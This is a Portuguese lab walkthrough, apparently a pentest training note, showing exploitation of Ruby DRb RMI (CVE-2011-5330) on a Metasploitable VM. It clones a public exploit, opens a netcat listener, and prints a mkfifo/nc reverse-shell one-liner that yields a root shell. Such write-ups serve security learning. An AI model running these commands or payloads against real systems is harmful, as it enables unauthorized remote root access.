# Ruby DRb RMI
`8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)`
## Pesquisa vunerabilidade
Google: `vunerability Ruby DRb RMI (Ruby 1.8)`<br>
Vunerabilidade: `CVE-2011-5330`<br>
Google: `downlad exploit CVE-2011-5330 github`
```
H4R335HR/drbpwn - Ruby script
GitHub
https://github.com › drbpwn
·
Traduzir esta página
This Ruby script provides a workaround for exploiting Distributed Ruby (DRb) vulnerabilities using instance_eval and syscall methods.
```

## Download do exploit
```
$ git clone https://github.com/H4R335HR/drbpwn.git
Cloning into 'drbpwn'...
remote: Enumerating objects: 49, done.
remote: Counting objects: 100% (49/49), done.
remote: Compressing objects: 100% (49/49), done.
remote: Total 49 (delta 23), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (49/49), 16.93 KiB | 1.41 MiB/s, done.
Resolving deltas: 100% (23/23), done.
```
`$ cd drbpwn`
## Abrindo o netcat
Em outro terminal, prepare o listener. Uma vez estabelecida a conexão, teremos acesso a uma shell reversa.
```
nc -lvnp 4444
listening on [any] 4444 ...
```
## rodando o exploit
```
$ ruby drbpwn.rb 192.168.1.33 8787 192.168.1.10
mkfifo /tmp/gythfa; nc 192.168.1.10 4444 0</tmp/gythfa | /bin/sh >/tmp/gythfa 2>&1; rm /tmp/gythfa
Trying to exploit instance_eval
Instance eval failed! trying to exploit syscall
Payload executed from file .CnvTEkQ9Dj1YaPPb
Make sure you are listening on lport
```
## resultado
```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.10] from (UNKNOWN) [192.168.1.33] 38065

whoami
root

hostname
metasploitable
```

